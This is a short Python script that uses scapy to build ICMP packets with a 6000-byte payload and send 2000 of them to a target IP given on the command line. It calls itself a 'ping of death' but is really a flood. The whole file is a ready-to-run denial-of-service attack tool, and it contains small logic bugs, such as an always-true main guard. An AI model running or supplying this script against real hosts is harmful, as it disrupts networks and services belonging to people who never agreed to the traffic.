from scapy.all import *

def Pod(ip):
	#Change according with your IP addresses
	SOURCE_IP="10.0.0.3"
	TARGET_IP=ip
	MESSAGE="T"
	NUMBER_PACKETS=2000 # Number of pings

	pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*6000)
	send(NUMBER_PACKETS*pingOFDeath)


def main():
    function = sys.argv[1]
    if function == 'Pod':
        if len(sys.argv) < 1:
            print(sys.argv[0])
        else:
            p = (sys.argv[2])
            Pod(p)
if {__name__ == "__main__"}:
    main()
